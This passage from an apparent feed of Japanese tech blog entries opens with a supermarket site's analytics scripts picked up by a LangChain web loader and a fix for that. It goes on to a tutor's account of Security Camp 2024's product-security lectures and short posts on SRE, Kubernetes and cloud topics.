 Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'anzen_himitsu\', \'event_label\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); gtag(\'event\', \'anzen_himitsu\', {\'anzen_himitsu\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); }); $(\'.recipe_btm_link\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'recipe_btm_link\', \'event_label\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); gtag(\'event\', \'recipe_btm_link\', {\'recipe_btm_link\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); }); $(\'.3step_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'3step_btn\', \'event_label\' : \'3step_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'3step_btn\', {\'3step_btn\' : \'3step_btn\'}); });\\\\n\\" +      \\"$(\'.setsuyaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'setsuyaku_btn\', \'event_label\' : \'setsuyaku_btn\'}); gtag(\'event\',\\\\n\\" +      \\"\'setsuyaku_btn\', {\'setsuyaku_btn\' : \'setsuyaku_btn\'}); });\\\\n\\" +      \\"$(\'.quick_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'quick_btn\', \'event_label\' : \'quick_btn\'}); gtag(\'event\', \'quick_btn\',\\\\n\\" +      \\"{\'quick_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'setsuyaku_btn\'}); }); $(\'.quick_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'quick_btn\', \'event_label\' : \'quick_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'quick_btn\', {\'quick_btn\' : \'quick_btn\'}); });\\\\n\\" +      \\"$(\'.honkaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'honkaku_btn\', \'event_label\' : \'honkaku_btn\'}); gtag(\'event\', \'honkaku_btn\',\\\\n\\" +      \\"{\'honkaku_btn\' : \'honkaku_btn\'}); }); $(\'.recipe_item\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'recipe_item\', \'event_label\' :\\\\n\\" +      \\"\'recipe_item\'}); gtag(\'event\', \'recipe_item\', {\'recipe_item\' : \'recipe_item\'});\\\\n\\" +      \\"}); $(\'.all_recipe_btn\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'all_recipe_btn\', \'event_label\' : \'all_recipe_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'all_recipe_btn\', {\'all_recipe_btn\' : \'all_recipe_btn\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_left\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'Visseel\', \'event_label\' : \'Visseel\'}); gtag(\'event\',\\\\n\\" +      \\"\'Visseel\', {\'Visseel\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'all_recipe_btn\'}); }); $(\'.sports_wrap .bun_left\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'Visseel\', \'event_label\' :\\\\n\\" +      \\"\'Visseel\'}); gtag(\'event\', \'Visseel\', {\'Visseel\' : \'Visseel\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_right\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'DeNA\', \'event_label\' : \'DeNA\'}); gtag(\'event\', \'DeNA\',\\\\n\\" +      \\"{\'DeNA\' : \'DeNA\'}); }); $(\'.sale_bnr\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'sale_bnr_mini\', \'event_label\' : \'sale_bnr_mini\'});\\\\n\\" +      \\"gtag(\'event\', \'sale_bnr_mini\', {\'sale_bnr_mini\' : \'sale_bnr_mini\'}); });\\\\n\\" +      \\"$(\'.top_ec_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_ec_btn\', \'event_label\' : \'top_ec_btn\'}); gtag(\'event\', \'top_ec_btn\',\\\\n\\" +      \\"{\'top_ec_btn\' : \'top_ec_btn\'}); }); $(\'.top_halal_btn\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\\\n\\" +      \\"\'top_halal_btn\'}); }); $(\'.gyomuca_slide\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'gyomuca_slide\', \'event_label\' : \'gyomuca_slide\'});\\\\n\\" +      \\"gtag(\'event\', \'gyomuca_slide\', {\'gyomuca_slide\' : \'gyomuca_slide\'}); });\\\\n\\" +      \\"$(\'.gyomuca_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'gyomuca_btn\', \'event_label\' : \'gyomuca_btn\'}); gtag(\'event\', \'gyomuca_btn\',\\\\n\\" +      \\"{\'gyomuca_btn\' : \'gyomuca_btn\'}); }); $(\'.top_shop_bnr a\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_shop_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); gtag(\'event\', \'top_shop_bnr\', {\'top_shop_bnr\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); }); $(\'.top_bargain_bnr a\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'top_bargain_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_bargain_bnr\'}); gtag(\'event\', \'top_bargain_bnr\', {\'top_bargain_bnr\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"a\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_bargain_bnr\', \'event_label\' : \'top_bargain_bnr\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_bargain_bnr\', {\'top_bargain_bnr\' : \'top_bargain_bnr\'}); });\\\\n\\" +      \\"$(document).ready(function() { $(\'.drawer\').drawer(); }); //infoaccordion\\\\n\\" +      `$(function(){ $(\\".infoac dt\\").not(\'#noicon\').on(\\"click\\", function() {\\\\n` +      \'$(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); }); }); //scroll\\\\n\' +      `$(function(){ // #で始まるリンクをクリックしたら実行されます $(\'a[href^=\\"#\\"]\').click(function() { //\\\\n` +      \'スクロールの速度 var speed = 600; // ミリ秒で記述 var href= $(this).attr(\\"href\\"); var target =\\\\n\' +      `$(href == \\"#\\" || href == \\"\\" ? \'html\' : href); var position =\\\\n` +      \\"target.offset().top; $(\'body,html\').animate({scrollTop:position}, speed,\\\\n\\" +      \\"\'swing\'); return false; }); }); //matchHeight $(function(){\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"var position = target.offset().top; $(\'body,html\').animate({scrollTop:position},\\\\n\\" +      \\"speed, \'swing\'); return false; }); }); //matchHeight $(function(){\\\\n\\" +      \\"$(\'.mh\').matchHeight(); }); function news_link(id,year) {\\\\n\\" +      \'document.newslink.ne_id.value=id; document.newslink.ne_year.value=year;\\\\n\' +      \'document.newslink.submit(); } $(function(){ $(\\"#acMenu dt\\").on(\\"click\\",\\\\n\' +      \'function() { $(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); });\\\\n\' +      \'}); $(\\".information dl dt\\\\n\' +      `p:contains(\'「酒類の品目等の表示義務」改正に伴う「麦旨」の品目表示及び税率適用区分表示の変更について\')\\").find(\'a\').attr({target:\\"_blank\\"});\\\\n` +      \'objectFitImages();\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  }]CheerioWebBaseLoaderはbodyタグ内を読むのですが、styleタグやscriptタグが入ってしまっているからなんですね。そこで、CheerioWebBaseLoaderを使わず、URLからfetchして、cheerioTextで得たbodyタグの中からstyleタグやscriptタグの中身を除去したコードを実行。npx ts-node webLoad.ts https://www.gyomusuper.jp/綺麗に取れました！！bodyContent:お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針ホーム商品紹介ミラクルレシピ特集一覧安心安全の取り組み業務スーパーとはGyomucaお問い合わせオンラインショップFC加盟店募集会社案内日本語/ENGLISH/中文NEWITEM新着商品新着ホット＆スパイシーヌードルホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。詳しくはこちら詳しくはこちらPICKUP!おすすめ商品商品をもっと見る新着パルメザンチーズのリゾットイタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！詳しくはこちらパルメザンチーズ[要冷蔵]詳しくはこちらPICKUP!おすすめレシピレシピをもっと見るSPECIALTOPICS特集特集をもっと見るSNS公式Instagram・公式X（旧Twitter）TweetsbyGyomusuperOFCL公式Instagram公式X（旧Twitter）2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。一覧を見る『世界の本物』を直輸入！業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！安さの秘密自慢の国内自社工場の『オリジナル』国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！安全・安心の秘密スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。店舗検索特売情報ホームWEBチラシ店舗案内ミラクルレシピ商品紹介直輸入商品国内自社工場商品業務スーパーとは安さの秘密安全安心の取り組み商品開発事前チェック現地工場チェック品質安全検査商品検証FC加盟店募集業務スーパー5つの強み業務スーパーの特徴オープンまでのプロセス体制について契約概要・加盟条件物件・商品のご提案募集お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針〒675-0063兵庫県加古川市加古川町平野125番1\xa92018-GyomuSuperAllRightsReserved.","isoDate":"2024-08-31T13:34:16.000Z","dateMiliSeconds":1725111256000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"セキュリティ・キャンプ 2024 参加記","link":"https://moz-security.hatenablog.com/entry/2024/08/31/121836","contentSnippet":"8月12日から8月16日までの5日間で開催されたセキュリティ・キャンプ2024 全国大会のBクラス（プロダクトセキュリティ）にチューターとして参加したので、体験記を書き残す。昨年、Bクラス（当時は、Webセキュリティ）を修了し、今年チューターとして、もう一度セキュリティ・キャンプに参加することになった。昨年の参加記は、以下である。今読み返してみると、次はネクスト受講生かチューターで参加したいということを書いており、今年チューターとして参加できたのはとてもよかった。moz-security.hatenablog.com日程表Bクラスの日程は、このような感じだった。6つの専門講義があり、それに加えて共通講義やグループワーク, 特別講演などがあり、毎日8:30~21:00に稼働するというハードスケジュールとなっている。セキュリティ・キャンプ Bクラス スケジュール共通講義、グループワーク共通講義では、ゲームセキュリティや法律、人の心理・行動特性についての講義があった。また、毎日グループワークの時間が30分あり、1グループ4人構成でセキュリティ教育について話しあっていた。コンピュータを全く知らない主婦や子供からコンピュータサイエンスをある程度学んだ学生などさまざまなターゲットに対して、いろいろなアプローチでセキュリティ技術を伝えようとするアイデアがあり、ディスカッションや最終発表を見ていてとてもおもしろかった。専門講義Bクラスでは、プロダクト開発におけるセキュリティをテーマにして、講義が構成されていた。全て４時間の講義で、座学と演習の両方を行う形式になっている。1日目のホームルームでプロデューサーから、講義設計にあたり未知との遭遇の最大化を目標としている旨を伝えられた。知らないこともたくさん出てくるだろうが、「アウトプットを行う→フィードバックを得る→新たな知らないことが生まれる」のループを回すことをセキュリティキャンプを通じて、また、セキュリティキャンプが終わった後も行うことが大事だということを話されていた。また、技術の話だけでなくお金の話も講義に盛り込むようにしており、コストとセキュリティのバランスを見定めるといった、より社会で行われていることを体感して、社会に出た後に活躍してほしいというお話があった。そういう意味で、プロデューサーがBクラスは社会人クラスと言っていたのもおもしろかった。これら２つのことは、講義を全て終えた今、改めてとてもプロデューサーの講義設計に対する意図や思いを感じている。2日目B1: プロダクトセキュリティの展望セキュリティ・キャンプ2024 全国大会 B1 プロダクトセキュリティの展望(#seccamp2024) | ドクセル\\"プロダクトセキュリティの展望\\" では、プロダクトの定義とそれが指す範囲の広さ、非機能要件であるセキュリティと組織としての向き合い方について学んだ。なかでも、社会と技術と資産を面で見れるようになるとセキュリティを俯瞰して見ること・考えることができ、面で見れるようになるためには、社会の変化に敏感になることが重要であるということはとても記憶に残っている。セキュリティを仕事にする上で新技術の把握や継続的な学習は大事だと言われているが、この講義を通して再認識させられた。また、プロダクトの価値を早く・大きく・継続して届けるための技術についても学んだ。これらはお金が密接に絡んでくる点で経営側の視点も必要であり、今まで考えたことがなかったが、組織で自分が影響力を発揮していくためには押さえておく必要はあるし、今後勉強していきたいと思った。最後に、組織規模に応じたセキュリティ対策について学んだ。セキュリティ対策が必要だといっても実際に行うには導入・運用にコストがかかるため、コストとセキュリティのバランスが必要となってくるし、その判断が難しいのはよく言われているためすでにわかっていた。しかし、ではどれくらいの組織規模に対してどのような対策を行うのかということは今まであまり考えたことなく（学生で考える人はあまりいないと思っているが）、グループディスカッションや発表、講師以外の方のお話なども含めてとても学びになった。いろんな会社のいろんな役職の人たちがいるのもセキュリティ・キャンプのよさであると思う。B-2: 情報セキュリティ戦略戦術ワークショップ\\"情報セキュリティ戦略戦術ワークショップ\\" では、組織のセキュリティ対策の進め方やインシデントハンドリングについて学んだ。この講義でも、やはり組織規模に応じたセキュリティ対策についてのお話はあり、やらないといけないことはたくさんあるがどれから取り組むかを考えるといったときに、ベストプラクティスやガイドライン、フレームワークは非常に参考になることがわかった。また、インシデント対応において、まず気付ける仕組みと改善の実施が重要であることがわかった。たしかにログが残っていたり、インシデント発生時にアラートが出なかったりすると、そもそもインシデントに気付けない。そのため、セキュリティ担当でなかったとしても、インシデントに気付くために一開発者としてどのような情報（ログ, メトリクス, アラート）が必要なのかは考えるようにしたいと思った。演習では、受講生がグループでインシデントハンドリングを体験しており、チューターとしてはチャットツールでの関係者とのやり取りを見ていた。インシデントというと私は外部の攻撃者からのサイバー攻撃を想像してしまうが、それだけではない。メールの誤送信などといったオペレーションミスや部署間での情報共有の不足、内部不正なども、ちゃんとインシデントであり、それも意外と発生してしまうことがあることを学んだ。演習で関係者とのやりとりがなかなかうまくいかず、大変そうだったのはとても記憶に残っている（覚えるべきとこはそこじゃないw）。3日目B-3: セキュリティ監視入門セキュリティ監視入門 | Notion\\"セキュリティ監視入門\\" では、監視の重要性と監視アーキテクチャの設計・構築について学んだ。監視をする上で最も重要で、最初に考えなければいけないのはなぜ監視するのか・何のために監視するのかであり、そこが曖昧であると例え監視を行っていて異常を見つけたり、アラートが出たりしても、その後の対応に繋がらないということはとても頭に残っている。この講義でもB-1に引き続いて、組織規模に応じた監視アーキテクチャの構築やSOCやCSIRTといった組織の構築を学んだ。どれだけのコストをセキュリティ対策にかけるかは経営判断だが、現場で何が行われているのかやどのようなデータがどこに存在しているかは把握していなければ、セキュリティ監視を行うことやそれにかかるコストを見積もることはできない。ログの対象となるデータは無限と言っていいほど存在しており、どのログを取るのかとコストのバランスを考えることがセキュリティ担当者としての腕の見せ所であることがわかった。また、セキュリティ監視において大規模な運用が始まると不可逆性はかなり高いことも学んだ。これは、データ移行が大変になるからという理由だったが、私自身今までトライアンドエラーを繰り返すことをよしとしていたため、セキュリティ監視というケースではそれがあまりふさわしくないこともあることがわかった。B-4: モダンなプロダクト開発を攻撃者の視点で捉える\\"モダンなプロダクト開発を攻撃者の視点で捉える\\" では、攻撃者がどうやって組織に対して攻撃を行うのかについて学んだのちに、それにやられないために防御側はどのような対策が必要なのかということを考えた。講義を通して、攻撃側と防御側の両方の視点でセキュリティを考えることができたのは非常に学びになった。なかでも、攻撃者はフロー（グラフ）で考え、防御側はリストで考えるというのはとても記憶に残っている。攻撃側は一点だけでも突破できればいいのに対して、防御側は全てを守らなければならない。加えて、多層防御を行い、全てを守っていると思っていても、攻撃者は全く思わぬところからクリティカルな攻撃を行うかもしれない（VPNの脆弱性を突いて初期侵入とかではなく、物理的に侵入するとか）。そのため、セキュリティ担当者として組織を守るには、ベストプラクティスやガイドラインを参考にしつつ、明確なWhyを持ったセキュリティ対策を取るように意識することが重要になってくるとわかった。ゼロトラストやDevSecOpsといった新しく出てきたワードに縛られないようにすることも重要であり、それもWhyを意識することで具体的なセキュリティ対策の実現という本質的な部分に焦点を当てることができることを学んだ。大学や勉強会では防御について学んだり考えたりすることが多いが、攻撃側の視点を養うためにも、もっとHack The Boxを頑張ろうと思う。4日目B-5: 設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\"設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\" では、プロダクト開発において考慮すべきセキュリティと実践方法について学んだ。プロダクトをセキュアにするというと、実装する際に脆弱性を作らないよう気をつけたりリリース前に脆弱性診断を行ったりすることを私はイメージする。しかし、要件定義・設計・実装の段階にテスト工程を前倒しにするというShift-leftの理解と実践により、開発工程の早い段階で脆弱性の検出を行うことが重要であることがわかった。ただ、早い段階で脆弱性を発見しようとするとやらないといけないことが大量に増えるため、できるだけ自動化して、人でないとできない箇所に開発者が注力できる仕組みを作ることが大事だと学んだ。セキュリティに携わるものとして、意識改革やセキュリティ教育ももちろん大事だが、技術者である以上、仕組みで解決できないかという視点は大事だと思う。脆弱性を自動で発見する方法としてはSASTやDASTというものがあり、これらのツールを使ってスキャンを行うことを学んだ。これをCI/CDのパイプラインに組み込むことで、例えば、マージされたタイミングでSASTを行い、ステージング環境にデプロイしたタイミングでDASTを行うといったことができる。これにより、仮に開発者に全くセキュリティの知識がなくても、ある程度のセキュリティは担保することができることがわかった。B-6: クラウドネイティブなシステムを保護するための実践的KubernetesセキュリティGitHub - kyohmizu/seccamp2024-B6\\"クラウドネイティブなシステムを保護するための実践的Kubernetesセキュリティ\\" では、Kubernetesとは何かということととコンテナやKubernetesに対する脅威・セキュリティ対策について学んだ。なかでも、3章の攻撃シナリオを学び、実際に演習したことは記憶に残っている。Kubernetesやコンテナに対する攻撃手法として、コンテナブレイクアウトや認証情報の窃取があることはすでに知っていたが、それ単体で攻撃として成り立つわけではなく、攻撃の中の一工程に過ぎない。そのため、演習を通して、OSコマンドインジェクションの脆弱性を突いた後、徐々に範囲を拡大していき、最終的にKubernetesクラスタのAdmin権限取得まで行うとという経験ができたのはよかった。Kubernetesに対する脅威を身にしみて実感できたし、攻撃者が範囲を拡大していく（ラテラルムーブメント）どこか一箇所でも防ぐことができればここまでやられなかったかもしれないといった防御視点でも考えることができた。講義全体を通して昨年に引き続き、B-1からB-6まで非常に幅広い分野の講義があった。どの講義も講師の方が4時間で終わるか怪しいと講義前から言うほどのボリュームになっており、チューターとして参加しながらも、全てを理解できているわけではない。また、講義の位置付けとしては一応入門となっているし、講義資料には大量のリンクが貼ってある。これは、もっと勉強することはあるよというメッセージ？だろう。勉強するための足がかりも与えられた今、これらを活用して、今後さらに勉強していきたいと思う。また、どの講義でもコストとセキュリティについて取り上げられており、組織の中でセキュリティ対策を進めていこうと思うとコストとセキュリティを見定める能力（費用対効果を考える能力）は求められることを強く実感した。チューターとして立ち位置としては講師と受講生の間となるため、セキュリティ・キャンプ全体を通して、昨年よりもいろんな人といろんな話をすることができた気がする。今思い返すと、受講生として参加した昨年は講義に食らいつくのに必死だったし、自分のスキルに自信もなく、講師の方にも積極的に話を聞きにいこうとしていなかった。今年はチューターとして講義全体を俯瞰して見ることができ、受講生として参加したときよりも少しだけ気持ちに余裕が持てたのはよかったと思う。一方で、受講生の知識・スキルの高さには驚かされ、チューターと受講生というよりは、同じ関心を持つ同世代の仲間という気持ちで講義だけに限らず、休憩時間やご飯の時間も含めてたくさんの話ができたし、そのなかで勉強になることも多かった。チューターとして参加してみて、受講生が演習で困っているときに一緒に解決できたときには私も嬉しかったし、教えたり技術を広めることの面白さを少しだけ感じることができた気がする。セキュリティ・キャンプを修了した方には、チューターとしてセキュリティ・キャンプにもう一度参加することも検討に入れるのをお勧めしたい。感想どの講義も濃密で、チューターとして参加した今年も私にとって初めて知ることも多かった。勉強するきっかけをたくさん与えられるので、キャンプ中はもちろんのことキャンプ後も継続して勉強するネタが見つかるし、私自身これからもっと勉強したいと思う。また、受講生やチューターとして参加している同世代のすごい人たちやセキュリティの第一線で活躍している講師の方や関係者の方を見て話すことができ、今年もとても刺激を受けることができた。講義資料自体は講師の方が公開されているものも多くある（Bクラスの講義に限らず）ため、講師の方と話したり、みんなで議論したりできることこそがセキュリティ・キャンプに参加することの一番のよさであると思う。セキュリティに興味がある人はもちろん、もっと広くコンピュータに興味がある人全員にセキュリティ・キャンプを勧めたい。昨年書いていたので、今年も書いておこうと思う。来年はネクストの受講生としてまた戻ってきたい。Bクラス ほかの方のブログhack.nikkei.comzenn.dev","isoDate":"2024-08-31T03:18:36.000Z","dateMiliSeconds":1725074316000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"SRETT#10 ~ 夏のSRE祭り！アーカイブ動画公開！","link":"https://shu-kob.hateblo.jp/entry/2024/08/30/230631","contentSnippet":"shu-kob.hateblo.jp2024年8月23日に弊社スリーシェイクのコミュニティ勉強会「SRETT #10 ~ 夏のSRE祭り！」が開催されました。www.youtube.comアーカイブ動画も公開されています！当日ご参加できなかった方もぜひご覧ください！自分は当日誘導係をやっていて、最初の菱田さんのセッション「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」は最後のちょびっとだけしか聴けていないから、観ようかな。","isoDate":"2024-08-30T14:06:31.000Z","dateMiliSeconds":1725026791000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"CCoEとは","link":"https://sreake.com/blog/ccoe%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 現在、さまざまな業界の多種多様なシステムにおいて、クラウドサービス\xad\xadが広く活用されています。クラウドサービスの利用は、誰もが簡単にインフラを操作できるというメリットをもたらした一方で、セキュリティやコス […]The post CCoEとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-30T00:00:00.000Z","dateMiliSeconds":1724976000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetesとは","link":"https://sreake.com/blog/kubernetes/","contentSnippet":"1. はじめに 多様で複雑な現代のソフトウェア開発において、アプリケーションの高速なデプロイや、運用の効率化・自動化は重要な課題となっています。 特に、マイクロサービスアーキテクチャの普及に伴い、複数のコンテナ化されたサ […]The post Kubernetesとは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-30T00:00:00.000Z","dateMiliSeconds":1724976000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オライリーのAWS生成AI本","link":"https://shu-kob.hateblo.jp/entry/2024/08/29/234143","contentSnippet":"AWSではじめる生成AI ―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje Barth,Shelbee EigenbrodeオライリージャパンAmazonそういや、オライリージャパンからAWSの生成AI本出てますね。欲しいと思いながらも買うてない。現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、面白そうなら買うてみるしか！翻訳はAWS Japanの久富木 隆一さん。AWSの中の人が翻訳しているので確かでしょうね！","isoDate":"2024-08-29T14:41:43.000Z","dateMiliSeconds":1724942503000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"GitLab Runnerによる簡易的なCICDの設計と実装","link":"https://sreake.com/blog/gitlab-runner-cicd/","contentSnippet":"はじめに はじめまして。Sreake事業部インターン生の高島です。2023年10月から長期インターン生としてKubernetes関連技術の習得とSRE技術の調査・検証を行っています。普段は、情報系の大学院生で、数値解析に […]The post GitLab Runnerによる簡易的なCICDの設計と実装 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-08-29T05:34:28.000Z","dateMiliSeconds":1724909668000,"authorName":"Sreake","authorId":"Sreake"},{"title":"「SREをはじめよう」(Becoming SRE邦訳)が出版","link":"https://shu-kob.hateblo.jp/entry/2024/08/28/235736","contentSnippet":"SREをはじめよう ―個人と組織による信頼性獲得への第一歩作者:David N. Blank-EdelmanオライリージャパンAmazon「Becoming SRE」の邦訳である「SREをはじめよう」が2024/10/8オライリージャパンから発売されます！翻訳は、オライリーのSRE系の邦訳を数多く手掛けられてきた山口 能迪さん（Google所属）個人がSREになる、組織がSREになるという二面で書かれているようで、今からとても楽しみです！","isoDate":"2024-08-28T14:57:36.000Z","dateMiliSeconds":1724857056000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス","link":"https://shu-kob.hateblo.jp/entry/2024/08/27/235840","contentSnippet":"pages.sreake.comイベントで登壇していました。ご参加くださった方はありがとうございました！良い評価をいただけたようで光栄です！今回、「生成AI利活用を進めるためのプロセス」というテーマだったので、普段私があまり話さないことも話せて新鮮でした。genai-users.connpass.com普段は、日本生成AIユーザ会でハンズオンをやっているように、具体的技術を話すことが多いので。今回とても良い経験になりました。今後も良い発表ができるよう精進していきます！","isoDate":"2024-08-27T14:58:40.000Z","dateMiliSeconds":1724770720000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"VPC Latticeについて","link":"https://zenn.dev/k_nagase/articles/vpc_lattice_basic","contentSnippet":"VPC LatticeとはVPC Latticeはサービス間を接続し、監視・通信の暗号化・認証認可などの機能を提供するサービスです。いわゆるLinkerdやIstioのようなサービスメッシュツールのようなイメージで利用できます。具体的には以下のような機能があります。サービス間通信における認証機能(IAM)アクセスログやメトリクスの収集などのモニタリングサービスディスカバリmTLS化ユーザ定義のカスタムドメインでの名前解決 ユースケース複数のプロダクトを各チームが個別にAWSアカウント単位またはVPC単位で管理しており、それらをメッシュ上に通信可能にするような...","isoDate":"2024-08-27T07:38:56.000Z","dateMiliSeconds":1724744336000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"後継者不足のCOBOLを生成AIに引き継ぎ","link":"https://shu-kob.hateblo.jp/entry/2024/08/26/235854","contentSnippet":"www.itmedia.co.jpIT media 